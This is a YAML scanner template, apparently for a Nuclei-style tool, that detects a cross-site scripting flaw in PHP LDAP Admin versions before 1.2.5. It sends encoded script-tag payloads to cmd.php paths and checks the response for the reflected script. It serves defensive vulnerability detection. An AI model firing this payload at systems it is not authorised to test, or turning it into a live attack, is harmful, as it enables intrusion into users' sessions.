id: phpldapadmin-xss
brief:
    title: PHP LDAP Admin < 1.2.5 - Cross-Site Scripting
    by: GodfatherOrwa
    level: medium
    about: PHP LDAP Admin is vulnerable to XSS.
    label:
        - php
        - phpldapadmin
        - xss
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}'
        - '{{BaseURL}}//cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
        - '{{BaseURL}}//index.php?redirect=true&meth=ajax'
        - '{{BaseURL}}/htdocs/index.php/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
        - '{{BaseURL}}/htdocs/index.php/index.php?redirect=true&meth=ajax'
        - '{{BaseURL}}/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&meth=ajax&server_id=1'
        - '{{BaseURL}}/phpldapadmin/index.php?redirect=true&meth=ajax'
      signs:
        - "on": word
          has:
            - <script>alert(document.domain)</script>
            - No such entry
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
